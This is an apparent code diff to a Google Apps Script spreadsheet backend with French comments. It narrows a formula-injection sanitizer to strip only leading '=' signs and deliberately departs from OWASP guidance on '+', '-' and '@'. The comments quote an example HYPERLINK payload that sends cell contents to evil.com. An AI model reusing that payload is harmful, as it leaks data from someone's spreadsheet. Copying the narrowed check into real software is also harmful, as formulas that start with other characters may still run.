@@ -11,15 +11,22 @@ function sheet_(tabName) {
 }
 
 /**
- * Neutralise une injection de formule : une chaîne commençant par =, +, -
- * ou @ serait interprétée par Sheets comme une formule dès que l'admin ouvre
- * le classeur (ex. prénom = '=HYPERLINK("http://evil.com?"&A1)' saisi via un
- * formulaire public). Le préfixe apostrophe force le type texte et reste
- * invisible à l'affichage — comportement standard de Sheets.
+ * Une chaîne commençant par "=" serait interprétée par Sheets comme une
+ * formule dès que l'admin ouvre le classeur (ex. prénom =
+ * '=HYPERLINK("http://evil.com?"&A1)' saisi via un formulaire public) — on
+ * retire simplement ce(s) signe(s) égal en tête, ce qui rend la cellule
+ * inerte quel que soit le reste du contenu. Volontairement PAS de préfixe
+ * apostrophe "force texte" : son comportement (invisible en saisie manuelle
+ * dans l'UI, mais pas garanti consommé par l'API Sheets/Apps Script) n'est
+ * pas fiable — et volontairement PAS +/-/@ (contrairement à la
+ * recommandation OWASP pour l'injection CSV/Excel), car le téléphone
+ * international ("+44...") saisi par l'admin passe par ce même chemin
+ * d'écriture ; ce classeur est consulté directement dans Sheets, jamais
+ * exporté puis réouvert dans un vieux tableur vulnérable à ces préfixes.
  */
 function sanitizeForSheet_(value) {
   if (typeof value !== 'string') return value;
-  return /^[=+\-@]/.test(value) ? "'" + value : value;
+  return value.replace(/^=+/, '');
 }
 
 function colIndex_(tabName, columnName) {
@@ -60,7 +67,13 @@ function updateRow_(tabName, rowNumber, updates) {
   });
 }
 
-/** Ajoute une nouvelle ligne à un onglet. rowObject = { colonne: valeur, ... } (colonnes absentes = vide). */
+/**
+ * Ajoute une nouvelle ligne à un onglet. rowObject = { colonne: valeur, ... }
+ * (colonnes absentes = vide). Utilise sh.appendRow (et non un calcul manuel
+ * de numéro de ligne) : c'est la primitive Sheets conçue pour rester sûre
+ * sous écritures concurrentes (plusieurs requêtes publiques simultanées),
+ * contrairement à un "getLastRow() + 1" qui pourrait faire collision.
+ */
 function appendRow_(tabName, rowObject) {
   const sh = sheet_(tabName);
   const headers = HEADERS[tabName];
